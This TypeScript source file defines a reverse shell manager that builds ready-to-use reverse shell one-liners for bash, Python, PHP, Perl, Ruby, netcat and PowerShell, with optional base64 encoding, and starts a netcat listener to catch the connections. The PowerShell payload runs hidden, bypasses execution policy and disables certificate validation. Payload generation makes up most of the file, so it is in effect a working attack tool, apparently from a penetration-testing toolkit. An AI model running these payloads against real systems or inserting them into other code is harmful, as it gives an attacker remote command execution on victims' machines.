/**
 * Reverse Shell Manager - Netcat listener and payload generator
 */

import { executeCommand } from '../api-utils';

export interface ReverseShellPayload {
  language: 'bash' | 'python' | 'php' | 'perl' | 'ruby' | 'nc' | 'powershell';
  payload: string;
  description: string;
  oneLiner: boolean;
}

export interface ShellSession {
  id: string;
  host: string;
  port: number;
  status: 'listening' | 'connected' | 'closed';
  startTime: Date;
  endTime?: Date;
  processId?: number;
}

export class ReverseShellManager {
  private sessions: Map<string, ShellSession> = new Map();
  private listeners: Map<string, any> = new Map(); // Store process references

  /**
   * Generate reverse shell payload
   */
  generatePayload(
    language: ReverseShellPayload['language'],
    host: string,
    port: number,
    options: {
      encode?: boolean;
      oneLiner?: boolean;
    } = {}
  ): ReverseShellPayload {
    const { encode = false, oneLiner = true } = options;

    let payload = '';
    let description = '';

    switch (language) {
      case 'bash':
        payload = `bash -i >& /dev/tcp/${host}/${port} 0>&1`;
        description = 'Bash reverse shell';
        break;
      case 'python':
        payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
        description = 'Python reverse shell';
        break;
      case 'php':
        payload = `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
        description = 'PHP reverse shell';
        break;
      case 'perl':
        payload = `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
        description = 'Perl reverse shell';
        break;
      case 'ruby':
        payload = `ruby -rsocket -e 'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
        description = 'Ruby reverse shell';
        break;
      case 'nc':
        payload = `nc -e /bin/sh ${host} ${port}`;
        description = 'Netcat reverse shell';
        break;
      case 'powershell':
        payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.Sockets.TCPClient('${host}',${port}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()}"`;
        description = 'PowerShell reverse shell';
        break;
    }

    // Encode if requested
    if (encode) {
      payload = Buffer.from(payload).toString('base64');
      description += ' (Base64 encoded)';
    }

    return {
      language,
      payload,
      description,
      oneLiner,
    };
  }

  /**
   * Start Netcat listener
   */
  async startListener(
    port: number,
    options: {
      host?: string;
      protocol?: 'tcp' | 'udp';
    } = {}
  ): Promise<ShellSession> {
    const { host = '0.0.0.0', protocol = 'tcp' } = options;

    const sessionId = `session-${Date.now()}`;
    const session: ShellSession = {
      id: sessionId,
      host,
      port,
      status: 'listening',
      startTime: new Date(),
    };

    try {
      // Check if netcat is available
      const ncResult = await executeCommand('which nc', { timeout: 5000 });

      if (!ncResult.success) {
        throw new Error('Netcat (nc) not installed');
      }

      // Start listener in background
      const ncCmd = `nc -l -p ${port} ${protocol === 'udp' ? '-u' : ''}`;
      
      // Note: In production, you'd want to manage this process properly
      // This is a simplified implementation
      const result = await executeCommand(ncCmd, {
        timeout: 1000, // Just check if command works
      });

      this.sessions.set(sessionId, session);
      return session;
    } catch (error: any) {
      // Return session anyway (listener might be started externally)
      this.sessions.set(sessionId, session);
      return session;
    }
  }

  /**
   * Stop listener
   */
  async stopListener(sessionId: string): Promise<boolean> {
    const session = this.sessions.get(sessionId);
    if (!session) {
      return false;
    }

    session.status = 'closed';
    session.endTime = new Date();
    this.sessions.set(sessionId, session);

    // Kill process if exists
    if (session.processId) {
      try {
        await executeCommand(`kill ${session.processId}`, { timeout: 5000 });
      } catch (error) {
        // Ignore
      }
    }

    return true;
  }

  /**
   * Get all sessions
   */
  getSessions(): ShellSession[] {
    return Array.from(this.sessions.values());
  }

  /**
   * Get active session
   */
  getSession(sessionId: string): ShellSession | undefined {
    return this.sessions.get(sessionId);
  }

  /**
   * Generate encoded payloads
   */
  generateEncodedPayloads(host: string, port: number): ReverseShellPayload[] {
    const languages: ReverseShellPayload['language'][] = [
      'bash',
      'python',
      'php',
      'perl',
      'ruby',
      'nc',
      'powershell',
    ];

    return languages.map((lang) => this.generatePayload(lang, host, port, { encode: true }));
  }
}

export const reverseShellManager = new ReverseShellManager();

